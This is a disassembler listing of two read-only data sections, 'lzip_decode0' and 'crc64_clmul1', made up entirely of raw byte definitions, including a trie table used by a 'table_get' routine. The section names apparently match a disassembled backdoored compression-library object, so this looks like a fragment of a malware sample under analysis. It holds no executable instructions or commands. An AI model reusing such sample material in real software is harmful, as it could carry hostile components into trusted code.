.rodata.lzip_decode0:000000000000C2EB                 db  0Dh
.rodata.lzip_decode0:000000000000C2EC                 db  90h
.rodata.lzip_decode0:000000000000C2ED                 db    3
.rodata.lzip_decode0:000000000000C2EE                 db 0D8h
.rodata.lzip_decode0:000000000000C2EF                 db  0Ch
.rodata.lzip_decode0:000000000000C2F0                 db  10h
.rodata.lzip_decode0:000000000000C2F1                 db    2
.rodata.lzip_decode0:000000000000C2F2                 db  14h
.rodata.lzip_decode0:000000000000C2F3                 db  0Ch
.rodata.lzip_decode0:000000000000C2F4                 db  60h ; `
.rodata.lzip_decode0:000000000000C2F5                 db    4
.rodata.lzip_decode0:000000000000C2F6                 db  4Ch ; L
.rodata.lzip_decode0:000000000000C2F7                 db  0Bh
.rodata.lzip_decode0:000000000000C2F8                 db  60h ; `
.rodata.lzip_decode0:000000000000C2F9                 db    4
.rodata.lzip_decode0:000000000000C2FA                 db  34h ; 4
.rodata.lzip_decode0:000000000000C2FB                 db  0Bh
.rodata.lzip_decode0:000000000000C2FC                 db  10h
.rodata.lzip_decode0:000000000000C2FD                 db    4
.rodata.lzip_decode0:000000000000C2FE                 db  24h ; $
.rodata.lzip_decode0:000000000000C2FF                 db  0Bh
.rodata.lzip_decode0:000000000000C300                 db 0E0h
.rodata.lzip_decode0:000000000000C301                 db    5
.rodata.lzip_decode0:000000000000C302                 db  78h ; x
.rodata.lzip_decode0:000000000000C303                 db  0Ah
.rodata.lzip_decode0:000000000000C304                 db  90h
.rodata.lzip_decode0:000000000000C305                 db    4
.rodata.lzip_decode0:000000000000C306                 db  3Ch ; <
.rodata.lzip_decode0:000000000000C307                 db  0Ah
.rodata.lzip_decode0:000000000000C308                 db  70h ; p
.rodata.lzip_decode0:000000000000C309                 db    1
.rodata.lzip_decode0:000000000000C30A                 db 0C8h
.rodata.lzip_decode0:000000000000C30B                 db    8
.rodata.lzip_decode0:000000000000C30C                 db 0C0h
.rodata.lzip_decode0:000000000000C30D                 db    5
.rodata.lzip_decode0:000000000000C30E                 db  50h ; P
.rodata.lzip_decode0:000000000000C30F                 db    8
.rodata.lzip_decode0:000000000000C310                 db  80h
.rodata.lzip_decode0:000000000000C311                 db    5
.rodata.lzip_decode0:000000000000C312                 db 0FCh
.rodata.lzip_decode0:000000000000C313                 db    7
.rodata.lzip_decode0:000000000000C314                 db  80h
.rodata.lzip_decode0:000000000000C315                 db    5
.rodata.lzip_decode0:000000000000C316                 db 0E4h
.rodata.lzip_decode0:000000000000C317                 db    7
.rodata.lzip_decode0:000000000000C318                 db  20h
.rodata.lzip_decode0:000000000000C319                 db    1
.rodata.lzip_decode0:000000000000C31A                 db 0E4h
.rodata.lzip_decode0:000000000000C31B                 db    6
.rodata.lzip_decode0:000000000000C31C                 db 0B0h
.rodata.lzip_decode0:000000000000C31D                 db    0
.rodata.lzip_decode0:000000000000C31E                 db  8Ch
.rodata.lzip_decode0:000000000000C31F                 db    3
.rodata.lzip_decode0:000000000000C320                 db  90h
.rodata.lzip_decode0:000000000000C321                 db    0
.rodata.lzip_decode0:000000000000C322                 db    0
.rodata.lzip_decode0:000000000000C323                 db    3
.rodata.lzip_decode0:000000000000C324                 db 0D0h
.rodata.lzip_decode0:000000000000C325                 db    0
.rodata.lzip_decode0:000000000000C326                 db 0B8h
.rodata.lzip_decode0:000000000000C327                 db    2
.rodata.lzip_decode0:000000000000C328                 db  20h
.rodata.lzip_decode0:000000000000C329                 db    0
.rodata.lzip_decode0:000000000000C32A                 db  20h
.rodata.lzip_decode0:000000000000C32B                 db    1
.rodata.lzip_decode0:000000000000C32C                 db  10h
.rodata.lzip_decode0:000000000000C32D                 db    0
.rodata.lzip_decode0:000000000000C32E                 db 0ECh
.rodata.lzip_decode0:000000000000C32F                 db    0
.rodata.lzip_decode0:000000000000C330                 db  20h
.rodata.lzip_decode0:000000000000C331                 db    7
.rodata.lzip_decode0:000000000000C332                 db 0D4h
.rodata.lzip_decode0:000000000000C333                 db    0
.rodata.lzip_decode0:000000000000C334                 db  60h ; `
.rodata.lzip_decode0:000000000000C335                 db    5
.rodata.lzip_decode0:000000000000C336                 db  8Ch
.rodata.lzip_decode0:000000000000C337                 db    0
.rodata.lzip_decode0:000000000000C338                 db  30h ; 0
.rodata.lzip_decode0:000000000000C339                 db    7
.rodata.lzip_decode0:000000000000C33A                 db    8
.rodata.lzip_decode0:000000000000C33B                 db    0
.rodata.lzip_decode0:000000000000C33C                 db  12h
.rodata.lzip_decode0:000000000000C33D                 db    4
.rodata.lzip_decode0:000000000000C33E                 db    0
.rodata.lzip_decode0:000000000000C33F                 db    0
.rodata.lzip_decode0:000000000000C33F _rodata_lzip_decode0 ends
.rodata.lzip_decode0:000000000000C33F
.rodata.crc64_clmul1:000000000000C340 ; ===========================================================================
.rodata.crc64_clmul1:000000000000C340
.rodata.crc64_clmul1:000000000000C340 ; Segment type: Pure data
.rodata.crc64_clmul1:000000000000C340 ; Segment permissions: Read
.rodata.crc64_clmul1:000000000000C340 _rodata_crc64_clmul1 segment align_32 public 'CONST' use64
.rodata.crc64_clmul1:000000000000C340                 assume cs:_rodata_crc64_clmul1
.rodata.crc64_clmul1:000000000000C340                 ;org 0C340h
.rodata.crc64_clmul1:000000000000C340 trie_table2     db    0                 ; DATA XREF: table_get+4D↑o
.rodata.crc64_clmul1:000000000000C341                 db    0
.rodata.crc64_clmul1:000000000000C342                 db    0
.rodata.crc64_clmul1:000000000000C343                 db    0
.rodata.crc64_clmul1:000000000000C344                 db    1
.rodata.crc64_clmul1:000000000000C345                 db    0
.rodata.crc64_clmul1:000000000000C346                 db    0
.rodata.crc64_clmul1:000000000000C347                 db    0
.rodata.crc64_clmul1:000000000000C348                 db    0
.rodata.crc64_clmul1:000000000000C349                 db    0
.rodata.crc64_clmul1:000000000000C34A                 db    0
.rodata.crc64_clmul1:000000000000C34B                 db    0
.rodata.crc64_clmul1:000000000000C34C                 db    0
.rodata.crc64_clmul1:000000000000C34D                 db    0
.rodata.crc64_clmul1:000000000000C34E                 db    0
.rodata.crc64_clmul1:000000000000C34F                 db    0
.rodata.crc64_clmul1:000000000000C350                 db    0
.rodata.crc64_clmul1:000000000000C351                 db    0
.rodata.crc64_clmul1:000000000000C352                 db    0
.rodata.crc64_clmul1:000000000000C353                 db    0
.rodata.crc64_clmul1:000000000000C354                 db    0
.rodata.crc64_clmul1:000000000000C355                 db    0
.rodata.crc64_clmul1:000000000000C356                 db    0
.rodata.crc64_clmul1:000000000000C357                 db    0
.rodata.crc64_clmul1:000000000000C358                 db    0
.rodata.crc64_clmul1:000000000000C359                 db    0
.rodata.crc64_clmul1:000000000000C35A                 db    0
.rodata.crc64_clmul1:000000000000C35B                 db    0
.rodata.crc64_clmul1:000000000000C35C                 db    0
.rodata.crc64_clmul1:000000000000C35D                 db  20h
.rodata.crc64_clmul1:000000000000C35E                 db    0
.rodata.crc64_clmul1:000000000000C35F                 db    0
.rodata.crc64_clmul1:000000000000C360                 db    0
.rodata.crc64_clmul1:000000000000C361                 db    0
.rodata.crc64_clmul1:000000000000C362                 db    0
.rodata.crc64_clmul1:000000000000C363                 db    0
.rodata.crc64_clmul1:000000000000C364                 db    0
.rodata.crc64_clmul1:000000000000C365                 db    0
.rodata.crc64_clmul1:000000000000C366                 db    0
.rodata.crc64_clmul1:000000000000C367                 db    0
.rodata.crc64_clmul1:000000000000C368                 db    0
.rodata.crc64_clmul1:000000000000C369                 db    0
.rodata.crc64_clmul1:000000000000C36A                 db    0
.rodata.crc64_clmul1:000000000000C36B                 db    0
.rodata.crc64_clmul1:000000000000C36C                 db    0
.rodata.crc64_clmul1:000000000000C36D                 db  80h
.rodata.crc64_clmul1:000000000000C36E                 db    0
.rodata.crc64_clmul1:000000000000C36F                 db    0
.rodata.crc64_clmul1:000000000000C370                 db    0
.rodata.crc64_clmul1:000000000000C371                 db    0
.rodata.crc64_clmul1:000000000000C372                 db    0
.rodata.crc64_clmul1:000000000000C373                 db    0
.rodata.crc64_clmul1:000000000000C374                 db    0
.rodata.crc64_clmul1:000000000000C375                 db    0
.rodata.crc64_clmul1:000000000000C376                 db    0
.rodata.crc64_clmul1:000000000000C377                 db    0
.rodata.crc64_clmul1:000000000000C378                 db    0
.rodata.crc64_clmul1:000000000000C379                 db    0
.rodata.crc64_clmul1:000000000000C37A                 db    0
.rodata.crc64_clmul1:000000000000C37B                 db    0
.rodata.crc64_clmul1:000000000000C37C                 db    0
.rodata.crc64_clmul1:000000000000C37D                 db    0
.rodata.crc64_clmul1:000000000000C37E                 db    4
.rodata.crc64_clmul1:000000000000C37F                 db    0
.rodata.crc64_clmul1:000000000000C380                 db    0
.rodata.crc64_clmul1:000000000000C381                 db    0
.rodata.crc64_clmul1:000000000000C382                 db    0
.rodata.crc64_clmul1:000000000000C383                 db    0
.rodata.crc64_clmul1:000000000000C384                 db    0
.rodata.crc64_clmul1:000000000000C385                 db    0
.rodata.crc64_clmul1:000000000000C386                 db    4
.rodata.crc64_clmul1:000000000000C387                 db    0
.rodata.crc64_clmul1:000000000000C388                 db    0
.rodata.crc64_clmul1:000000000000C389                 db    0
.rodata.crc64_clmul1:000000000000C38A                 db    0
.rodata.crc64_clmul1:000000000000C38B                 db    0
.rodata.crc64_clmul1:000000000000C38C                 db    0
.rodata.crc64_clmul1:000000000000C38D                 db    0
.rodata.crc64_clmul1:000000000000C38E                 db    0
.rodata.crc64_clmul1:000000000000C38F                 db    0
.rodata.crc64_clmul1:000000000000C390                 db    0
.rodata.crc64_clmul1:000000000000C391                 db    0
.rodata.crc64_clmul1:000000000000C392                 db    0
.rodata.crc64_clmul1:000000000000C393                 db    0
.rodata.crc64_clmul1:000000000000C394                 db    0
.rodata.crc64_clmul1:000000000000C395                 db    0
.rodata.crc64_clmul1:000000000000C396                 db    0
.rodata.crc64_clmul1:000000000000C397                 db    0
.rodata.crc64_clmul1:000000000000C398                 db    0
.rodata.crc64_clmul1:000000000000C399                 db    0
.rodata.crc64_clmul1:000000000000C39A                 db    0
.rodata.crc64_clmul1:000000000000C39B                 db    0
.rodata.crc64_clmul1:000000000000C39C                 db    0
.rodata.crc64_clmul1:000000000000C39D                 db    1
.rodata.crc64_clmul1:000000000000C39E                 db    0
.rodata.crc64_clmul1:000000000000C39F                 db    0
.rodata.crc64_clmul1:000000000000C3A0                 db    0
.rodata.crc64_clmul1:000000000000C3A1                 db    0
.rodata.crc64_clmul1:000000000000C3A2                 db    0
.rodata.crc64_clmul1:000000000000C3A3                 db    0
.rodata.crc64_clmul1:000000000000C3A4                 db    0
.rodata.crc64_clmul1:000000000000C3A5                 db    0
.rodata.crc64_clmul1:000000000000C3A6                 db    0
.rodata.crc64_clmul1:000000000000C3A7                 db    0
.rodata.crc64_clmul1:000000000000C3A8                 db    0
.rodata.crc64_clmul1:000000000000C3A9                 db    0
.rodata.crc64_clmul1:000000000000C3AA                 db    0
.rodata.crc64_clmul1:000000000000C3AB                 db    0
.rodata.crc64_clmul1:000000000000C3AC                 db    0
.rodata.crc64_clmul1:000000000000C3AD                 db    0
.rodata.crc64_clmul1:000000000000C3AE                 db    8
.rodata.crc64_clmul1:000000000000C3AF                 db    0
.rodata.crc64_clmul1:000000000000C3B0                 db    0
.rodata.crc64_clmul1:000000000000C3B1                 db    0
.rodata.crc64_clmul1:000000000000C3B2                 db    0
.rodata.crc64_clmul1:000000000000C3B3                 db    0
.rodata.crc64_clmul1:000000000000C3B4                 db    0
.rodata.crc64_clmul1:000000000000C3B5                 db    0
.rodata.crc64_clmul1:000000000000C3B6                 db    0
.rodata.crc64_clmul1:000000000000C3B7                 db    0
.rodata.crc64_clmul1:000000000000C3B8                 db    0
.rodata.crc64_clmul1:000000000000C3B9                 db    0
.rodata.crc64_clmul1:000000000000C3BA                 db    0
.rodata.crc64_clmul1:000000000000C3BB                 db    0
.rodata.crc64_clmul1:000000000000C3BC                 db  40h ; @
.rodata.crc64_clmul1:000000000000C3BD                 db    0
.rodata.crc64_clmul1:000000000000C3BE                 db    8
.rodata.crc64_clmul1:000000000000C3BF                 db    0
.rodata.crc64_clmul1:000000000000C3C0                 db    1
.rodata.crc64_clmul1:000000000000C3C1                 db    0
.rodata.crc64_clmul1:000000000000C3C2                 db    0
.rodata.crc64_clmul1:000000000000C3C3                 db    0
.rodata.crc64_clmul1:000000000000C3C4                 db    0
.rodata.crc64_clmul1:000000000000C3C5                 db    0
.rodata.crc64_clmul1:000000000000C3C6                 db    0
.rodata.crc64_clmul1:000000000000C3C7                 db    0
.rodata.crc64_clmul1:000000000000C3C8                 db    0
.rodata.crc64_clmul1:000000000000C3C9                 db    0
.rodata.crc64_clmul1:000000000000C3CA                 db    0
.rodata.crc64_clmul1:000000000000C3CB                 db    0
.rodata.crc64_clmul1:000000000000C3CC                 db    0
.rodata.crc64_clmul1:000000000000C3CD                 db    0
.rodata.crc64_clmul1:000000000000C3CE                 db    0
.rodata.crc64_clmul1:000000000000C3CF                 db    0
.rodata.crc64_clmul1:000000000000C3D0                 db    0
.rodata.crc64_clmul1:000000000000C3D1                 db    0
.rodata.crc64_clmul1:000000000000C3D2                 db    0
.rodata.crc64_clmul1:000000000000C3D3                 db    0
.rodata.crc64_clmul1:000000000000C3D4                 db    0
.rodata.crc64_clmul1:000000000000C3D5                 db    2
.rodata.crc64_clmul1:000000000000C3D6                 db    0
.rodata.crc64_clmul1:000000000000C3D7                 db    0
.rodata.crc64_clmul1:000000000000C3D8                 db    0
.rodata.crc64_clmul1:000000000000C3D9                 db    0
.rodata.crc64_clmul1:000000000000C3DA                 db    0
.rodata.crc64_clmul1:000000000000C3DB                 db    0
.rodata.crc64_clmul1:000000000000C3DC                 db    0
.rodata.crc64_clmul1:000000000000C3DD                 db    0
.rodata.crc64_clmul1:000000000000C3DE                 db    0
.rodata.crc64_clmul1:000000000000C3DF                 db    0
.rodata.crc64_clmul1:000000000000C3E0                 db    0
.rodata.crc64_clmul1:000000000000C3E1                 db    0
.rodata.crc64_clmul1:000000000000C3E2                 db    0
.rodata.crc64_clmul1:000000000000C3E3                 db    0
.rodata.crc64_clmul1:000000000000C3E4                 db    0
.rodata.crc64_clmul1:000000000000C3E5                 db    0
.rodata.crc64_clmul1:000000000000C3E6                 db    0
.rodata.crc64_clmul1:000000000000C3E7                 db    0
.rodata.crc64_clmul1:000000000000C3E8                 db    0
.rodata.crc64_clmul1:000000000000C3E9                 db    0
.rodata.crc64_clmul1:000000000000C3EA                 db    0
.rodata.crc64_clmul1:000000000000C3EB                 db    0
.rodata.crc64_clmul1:000000000000C3EC                 db  10h
.rodata.crc64_clmul1:000000000000C3ED                 db    0
.rodata.crc64_clmul1:000000000000C3EE                 db    0
.rodata.crc64_clmul1:000000000000C3EF                 db    0
.rodata.crc64_clmul1:000000000000C3F0                 db    0
.rodata.crc64_clmul1:000000000000C3F1                 db    0
.rodata.crc64_clmul1:000000000000C3F2                 db    0
.rodata.crc64_clmul1:000000000000C3F3                 db    0
.rodata.crc64_clmul1:000000000000C3F4                 db    0
.rodata.crc64_clmul1:000000000000C3F5                 db    0
.rodata.crc64_clmul1:000000000000C3F6                 db    0
.rodata.crc64_clmul1:000000000000C3F7                 db    0
.rodata.crc64_clmul1:000000000000C3F8                 db    0
.rodata.crc64_clmul1:000000000000C3F9                 db    0
.rodata.crc64_clmul1:000000000000C3FA                 db    0
.rodata.crc64_clmul1:000000000000C3FB                 db    0
.rodata.crc64_clmul1:000000000000C3FC                 db    0
.rodata.crc64_clmul1:000000000000C3FD                 db  10h
.rodata.crc64_clmul1:000000000000C3FE                 db    0
.rodata.crc64_clmul1:000000000000C3FF                 db    0
.rodata.crc64_clmul1:000000000000C400                 db    0
.rodata.crc64_clmul1:000000000000C401                 db    0
.rodata.crc64_clmul1:000000000000C402                 db    0
.rodata.crc64_clmul1:000000000000C403                 db    0
.rodata.crc64_clmul1:000000000000C404                 db  20h
.rodata.crc64_clmul1:000000000000C405                 db    0
.rodata.crc64_clmul1:000000000000C406                 db    0
.rodata.crc64_clmul1:000000000000C407                 db    0
.rodata.crc64_clmul1:000000000000C408                 db    0
.rodata.crc64_clmul1:000000000000C409                 db    0
.rodata.crc64_clmul1:000000000000C40A                 db    0
.rodata.crc64_clmul1:000000000000C40B                 db    0
.rodata.crc64_clmul1:000000000000C40C                 db    0
.rodata.crc64_clmul1:000000000000C40D                 db    0
.rodata.crc64_clmul1:000000000000C40E                 db    0
.rodata.crc64_clmul1:000000000000C40F                 db    0
.rodata.crc64_clmul1:000000000000C410                 db    0
.rodata.crc64_clmul1:000000000000C411                 db    0
.rodata.crc64_clmul1:000000000000C412                 db    0
.rodata.crc64_clmul1:000000000000C413                 db    0
.rodata.crc64_clmul1:000000000000C414                 db    0
.rodata.crc64_clmul1:000000000000C415                 db    0
.rodata.crc64_clmul1:000000000000C416                 db    0
.rodata.crc64_clmul1:000000000000C417                 db  20h
.rodata.crc64_clmul1:000000000000C418                 db    0
.rodata.crc64_clmul1:000000000000C419                 db    0
.rodata.crc64_clmul1:000000000000C41A                 db    0
.rodata.crc64_clmul1:000000000000C41B                 db    0
.rodata.crc64_clmul1:000000000000C41C                 db    0
.rodata.crc64_clmul1:000000000000C41D                 db    0
.rodata.crc64_clmul1:000000000000C41E                 db    0
.rodata.crc64_clmul1:000000000000C41F                 db    0
.rodata.crc64_clmul1:000000000000C420                 db    0
.rodata.crc64_clmul1:000000000000C421                 db    0
.rodata.crc64_clmul1:000000000000C422                 db    0
.rodata.crc64_clmul1:000000000000C423                 db    0
.rodata.crc64_clmul1:000000000000C424                 db    0
.rodata.crc64_clmul1:000000000000C425                 db    0
.rodata.crc64_clmul1:000000000000C426                 db    0
.rodata.crc64_clmul1:000000000000C427                 db    0
.rodata.crc64_clmul1:000000000000C428                 db    0
.rodata.crc64_clmul1:000000000000C429                 db    0
.rodata.crc64_clmul1:000000000000C42A                 db    0
.rodata.crc64_clmul1:000000000000C42B                 db    0
.rodata.crc64_clmul1:000000000000C42C                 db    0
.rodata.crc64_clmul1:000000000000C42D                 db    2
.rodata.crc64_clmul1:000000000000C42E                 db    0
.rodata.crc64_clmul1:000000000000C42F                 db    0
.rodata.crc64_clmul1:000000000000C430                 db    0
.rodata.crc64_clmul1:000000000000C431                 db    0
.rodata.crc64_clmul1:000000000000C432                 db    0
.rodata.crc64_clmul1:000000000000C433                 db    0
.rodata.crc64_clmul1:000000000000C434                 db    0
.rodata.crc64_clmul1:000000000000C435                 db    0
.rodata.crc64_clmul1:000000000000C436                 db    0
.rodata.crc64_clmul1:000000000000C437                 db    0
.rodata.crc64_clmul1:000000000000C438                 db    0
.rodata.crc64_clmul1:000000000000C439                 db    0
.rodata.crc64_clmul1:000000000000C43A                 db    0
.rodata.crc64_clmul1:000000000000C43B                 db    0
.rodata.crc64_clmul1:000000000000C43C                 db    0
.rodata.crc64_clmul1:000000000000C43D                 db    0
.rodata.crc64_clmul1:000000000000C43E                 db    1
.rodata.crc64_clmul1:000000000000C43F                 db    0
.rodata.crc64_clmul1:000000000000C440                 db    0
.rodata.crc64_clmul1:000000000000C441                 db    0
.rodata.crc64_clmul1:000000000000C442                 db    0
.rodata.crc64_clmul1:000000000000C443                 db    0
.rodata.crc64_clmul1:000000000000C444                 db    0
.rodata.crc64_clmul1:000000000000C445                 db    1
.rodata.crc64_clmul1:000000000000C446                 db    0
.rodata.crc64_clmul1:000000000000C447                 db    0
.rodata.crc64_clmul1:000000000000C448                 db    0
.rodata.crc64_clmul1:000000000000C449                 db    0
.rodata.crc64_clmul1:000000000000C44A                 db    0
.rodata.crc64_clmul1:000000000000C44B                 db    0
.rodata.crc64_clmul1:000000000000C44C                 db    0
.rodata.crc64_clmul1:000000000000C44D                 db    0
.rodata.crc64_clmul1:000000000000C44E                 db    0
.rodata.crc64_clmul1:000000000000C44F                 db    0
.rodata.crc64_clmul1:000000000000C450                 db    0
.rodata.crc64_clmul1:000000000000C451                 db    0
.rodata.crc64_clmul1:000000000000C452                 db    0
.rodata.crc64_clmul1:000000000000C453                 db    0
.rodata.crc64_clmul1:000000000000C454                 db    0
.rodata.crc64_clmul1:000000000000C455                 db    0
.rodata.crc64_clmul1:000000000000C456                 db    0
.rodata.crc64_clmul1:000000000000C457                 db    4
.rodata.crc64_clmul1:000000000000C458                 db    0
.rodata.crc64_clmul1:000000000000C459                 db    0
.rodata.crc64_clmul1:000000000000C45A                 db    0
.rodata.crc64_clmul1:000000000000C45B                 db    0
.rodata.crc64_clmul1:000000000000C45C                 db    0
.rodata.crc64_clmul1:000000000000C45D                 db    0
.rodata.crc64_clmul1:000000000000C45E                 db    0
.rodata.crc64_clmul1:000000000000C45F                 db    0
.rodata.crc64_clmul1:000000000000C460                 db    0
.rodata.crc64_clmul1:000000000000C461                 db    0
.rodata.crc64_clmul1:000000000000C462                 db    0
.rodata.crc64_clmul1:000000000000C463                 db    0
.rodata.crc64_clmul1:000000000000C464                 db    0
.rodata.crc64_clmul1:000000000000C465                 db    0
.rodata.crc64_clmul1:000000000000C466                 db    0
.rodata.crc64_clmul1:000000000000C467                 db    1
.rodata.crc64_clmul1:000000000000C468                 db    0
.rodata.crc64_clmul1:000000000000C469                 db    0
.rodata.crc64_clmul1:000000000000C46A                 db    0
.rodata.crc64_clmul1:000000000000C46B                 db    0
.rodata.crc64_clmul1:000000000000C46C                 db    0
.rodata.crc64_clmul1:000000000000C46D                 db    0
.rodata.crc64_clmul1:000000000000C46E                 db    0
.rodata.crc64_clmul1:000000000000C46F                 db    0
.rodata.crc64_clmul1:000000000000C470                 db    0
.rodata.crc64_clmul1:000000000000C471                 db    0
.rodata.crc64_clmul1:000000000000C472                 db    0
.rodata.crc64_clmul1:000000000000C473                 db    0
.rodata.crc64_clmul1:000000000000C474                 db    0
.rodata.crc64_clmul1:000000000000C475                 db    0
.rodata.crc64_clmul1:000000000000C476                 db  10h
.rodata.crc64_clmul1:000000000000C477                 db    0
.rodata.crc64_clmul1:000000000000C478                 db    0
.rodata.crc64_clmul1:000000000000C479                 db    0
.rodata.crc64_clmul1:000000000000C47A                 db    0
.rodata.crc64_clmul1:000000000000C47B                 db    0
.rodata.crc64_clmul1:000000000000C47C                 db    0
.rodata.crc64_clmul1:000000000000C47D                 db    0
.rodata.crc64_clmul1:000000000000C47E                 db    0
.rodata.crc64_clmul1:000000000000C47F                 db    0
.rodata.crc64_clmul1:000000000000C480                 db    0
.rodata.crc64_clmul1:000000000000C481                 db    0
.rodata.crc64_clmul1:000000000000C482                 db    0
.rodata.crc64_clmul1:000000000000C483                 db    0
.rodata.crc64_clmul1:000000000000C484                 db    0
.rodata.crc64_clmul1:000000000000C485                 db  40h ; @
.rodata.crc64_clmul1:000000000000C486                 db    0
.rodata.crc64_clmul1:000000000000C487                 db    0
.rodata.crc64_clmul1:000000000000C488                 db    0
.rodata.crc64_clmul1:000000000000C489                 db    0
.rodata.crc64_clmul1:000000000000C48A                 db    0
.rodata.crc64_clmul1:000000000000C48B                 db    0
.rodata.crc64_clmul1:000000000000C48C                 db    0
.rodata.crc64_clmul1:000000000000C48D                 db    0
.rodata.crc64_clmul1:000000000000C48E                 db    0
.rodata.crc64_clmul1:000000000000C48F                 db    0
.rodata.crc64_clmul1:000000000000C490                 db    0
.rodata.crc64_clmul1:000000000000C491                 db    0
.rodata.crc64_clmul1:000000000000C492                 db    0
.rodata.crc64_clmul1:000000000000C493                 db    0
.rodata.crc64_clmul1:000000000000C494                 db    0
.rodata.crc64_clmul1:000000000000C495                 db  40h ; @
.rodata.crc64_clmul1:000000000000C496                 db    0
.rodata.crc64_clmul1:000000000000C497                 db    0
.rodata.crc64_clmul1:000000000000C498                 db    0
.rodata.crc64_clmul1:000000000000C499                 db    0
.rodata.crc64_clmul1:000000000000C49A                 db    0
.rodata.crc64_clmul1:000000000000C49B                 db    0
.rodata.crc64_clmul1:000000000000C49C                 db    0
.rodata.crc64_clmul1:000000000000C49D                 db    0
.rodata.crc64_clmul1:000000000000C49E                 db    8
.rodata.crc64_clmul1:000000000000C49F                 db    0
.rodata.crc64_clmul1:000000000000C4A0                 db    0
.rodata.crc64_clmul1:000000000000C4A1                 db    0
.rodata.crc64_clmul1:000000000000C4A2                 db    0
.rodata.crc64_clmul1:000000000000C4A3                 db    0
.rodata.crc64_clmul1:000000000000C4A4                 db    0
.rodata.crc64_clmul1:000000000000C4A5                 db  80h
.rodata.crc64_clmul1:000000000000C4A6                 db    0
.rodata.crc64_clmul1:000000000000C4A7                 db    0
.rodata.crc64_clmul1:000000000000C4A8                 db    0
.rodata.crc64_clmul1:000000000000C4A9                 db    0
.rodata.crc64_clmul1:000000000000C4AA                 db    0
.rodata.crc64_clmul1:000000000000C4AB                 db    0
.rodata.crc64_clmul1:000000000000C4AC                 db    0
.rodata.crc64_clmul1:000000000000C4AD                 db    0
.rodata.crc64_clmul1:000000000000C4AE                 db    0
.rodata.crc64_clmul1:000000000000C4AF                 db    0
.rodata.crc64_clmul1:000000000000C4B0                 db    0
.rodata.crc64_clmul1:000000000000C4B1                 db    0
.rodata.crc64_clmul1:000000000000C4B2                 db    0
.rodata.crc64_clmul1:000000000000C4B3                 db    0
.rodata.crc64_clmul1:000000000000C4B4                 db    0
.rodata.crc64_clmul1:000000000000C4B5                 db    0
.rodata.crc64_clmul1:000000000000C4B6                 db    0
.rodata.crc64_clmul1:000000000000C4B7                 db    0
.rodata.crc64_clmul1:000000000000C4B8                 db    0
.rodata.crc64_clmul1:000000000000C4B9                 db    0
.rodata.crc64_clmul1:000000000000C4BA                 db    0
.rodata.crc64_clmul1:000000000000C4BB                 db    0
.rodata.crc64_clmul1:000000000000C4BC                 db    0
.rodata.crc64_clmul1:000000000000C4BD                 db  40h ; @
.rodata.crc64_clmul1:000000000000C4BE                 db    0
.rodata.crc64_clmul1:000000000000C4BF                 db    0
.rodata.crc64_clmul1:000000000000C4C0                 db    0
.rodata.crc64_clmul1:000000000000C4C1                 db    0
.rodata.crc64_clmul1:000000000000C4C2                 db    0
.rodata.crc64_clmul1:000000000000C4C3                 db    0
.rodata.crc64_clmul1:000000000000C4C4                 db    0
.rodata.crc64_clmul1:000000000000C4C5                 db    0
.rodata.crc64_clmul1:000000000000C4C6                 db    0
.rodata.crc64_clmul1:000000000000C4C7                 db    0
.rodata.crc64_clmul1:000000000000C4C8                 db    0
.rodata.crc64_clmul1:000000000000C4C9                 db    0
.rodata.crc64_clmul1:000000000000C4CA                 db    0
.rodata.crc64_clmul1:000000000000C4CB                 db    0
.rodata.crc64_clmul1:000000000000C4CC                 db    4
.rodata.crc64_clmul1:000000000000C4CD                 db    0
.rodata.crc64_clmul1:000000000000C4CE                 db    0
.rodata.crc64_clmul1:000000000000C4CF                 db    0
.rodata.crc64_clmul1:000000000000C4D0                 db    0
.rodata.crc64_clmul1:000000000000C4D1                 db    0
.rodata.crc64_clmul1:000000000000C4D2                 db    0
.rodata.crc64_clmul1:000000000000C4D3                 db    0
.rodata.crc64_clmul1:000000000000C4D4                 db    0
.rodata.crc64_clmul1:000000000000C4D5                 db    0
.rodata.crc64_clmul1:000000000000C4D6                 db    0
.rodata.crc64_clmul1:000000000000C4D7                 db    0
.rodata.crc64_clmul1:000000000000C4D8                 db    0
.rodata.crc64_clmul1:000000000000C4D9                 db    0
.rodata.crc64_clmul1:000000000000C4DA                 db    0
.rodata.crc64_clmul1:000000000000C4DB                 db    0
.rodata.crc64_clmul1:000000000000C4DC                 db    0
.rodata.crc64_clmul1:000000000000C4DD                 db    0
.rodata.crc64_clmul1:000000000000C4DE                 db  20h
.rodata.crc64_clmul1:000000000000C4DF                 db    0
.rodata.crc64_clmul1:000000000000C4E0                 db    0
.rodata.crc64_clmul1:000000000000C4E1                 db    0
.rodata.crc64_clmul1:000000000000C4E2                 db    0
.rodata.crc64_clmul1:000000000000C4E3                 db    0
.rodata.crc64_clmul1:000000000000C4E4                 db    0
.rodata.crc64_clmul1:000000000000C4E5                 db    0
.rodata.crc64_clmul1:000000000000C4E6                 db    0
.rodata.crc64_clmul1:000000000000C4E7                 db    0
.rodata.crc64_clmul1:000000000000C4E8                 db    0
.rodata.crc64_clmul1:000000000000C4E9                 db    0
.rodata.crc64_clmul1:000000000000C4EA                 db    0
.rodata.crc64_clmul1:000000000000C4EB                 db    0
.rodata.crc64_clmul1:000000000000C4EC                 db  40h ; @
.rodata.crc64_clmul1:000000000000C4ED                 db    0
.rodata.crc64_clmul1:000000000000C4EE                 db    0
.rodata.crc64_clmul1:000000000000C4EF                 db    0
.rodata.crc64_clmul1:000000000000C4F0                 db    0
.rodata.crc64_clmul1:000000000000C4F1                 db    0
.rodata.crc64_clmul1:000000000000C4F2                 db    0
.rodata.crc64_clmul1:000000000000C4F3                 db    0
.rodata.crc64_clmul1:000000000000C4F4                 db    0
.rodata.crc64_clmul1:000000000000C4F5                 db    0
.rodata.crc64_clmul1:000000000000C4F6                 db    0
.rodata.crc64_clmul1:000000000000C4F7                 db    0
.rodata.crc64_clmul1:000000000000C4F8                 db    0
.rodata.crc64_clmul1:000000000000C4F9                 db    0
.rodata.crc64_clmul1:000000000000C4FA                 db    0
.rodata.crc64_clmul1:000000000000C4FB                 db    0
.rodata.crc64_clmul1:000000000000C4FC                 db    0
.rodata.crc64_clmul1:000000000000C4FD                 db    0
.rodata.crc64_clmul1:000000000000C4FE                 db  80h
.rodata.crc64_clmul1:000000000000C4FF                 db    0
.rodata.crc64_clmul1:000000000000C500                 db    0
.rodata.crc64_clmul1:000000000000C501                 db    0
.rodata.crc64_clmul1:000000000000C502                 db    0
.rodata.crc64_clmul1:000000000000C503                 db    0
.rodata.crc64_clmul1:000000000000C504                 db    0
.rodata.crc64_clmul1:000000000000C505                 db    0
.rodata.crc64_clmul1:000000000000C506                 db    0
